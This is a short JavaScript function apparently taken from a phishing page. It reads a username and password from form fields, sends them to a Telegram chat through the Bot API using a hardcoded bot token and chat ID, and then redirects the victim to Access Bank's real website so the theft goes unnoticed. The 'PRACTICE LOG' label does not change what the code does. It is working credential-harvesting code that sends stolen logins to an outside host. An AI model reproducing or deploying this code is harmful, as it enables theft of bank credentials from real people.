async function sendToBot() {
    // 1. Get values from the boxes
    const userVal = document.getElementById('user').value;
    const passVal = document.getElementById('pass').value;

    // 2. Your bot credentials
    const token = "8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo";
    const chatId = "7909543900";
    
    // 3. Create the message format
    const message = `🚨 PRACTICE LOG:\nUser: ${userVal}\nPass: ${passVal}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // 4. Send to Telegram
    await fetch(url); 
    
    // 5. Send user to a real site so they aren't confused
    window.location.href = "https://www.accessbankplc.com"; 
                                                                            }

